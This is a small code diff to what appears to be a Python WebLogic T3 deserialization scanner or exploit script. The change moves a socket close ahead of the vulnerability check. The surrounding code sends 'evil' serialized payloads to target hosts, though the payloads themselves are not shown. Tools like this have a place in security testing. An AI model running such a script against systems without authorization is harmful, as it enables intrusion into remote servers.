@@ -64,9 +64,9 @@ def run(rip,rport,index):
         t3handshake(sock,server_addr)
         buildT3RequestObject(sock,rport)
         rs=sendEvilObjData(sock,PAYLOAD[index])
+        sock.close()
         if checkVul(rs,index):
             return rip,rport
-        sock.close()
     except Exception as e:
         pass
     
@@ -77,9 +77,9 @@ def run(rip,rport,index):
         t3handshake(sock,server_addr)
         buildT3RequestObject(sock,rport)
         rs=sendEvilObjData(sock,PAYLOAD[index])
+        sock.close()
         if checkVul(rs,index):
             return rip,rport
-        sock.close()
     except Exception as e:
         pass
     
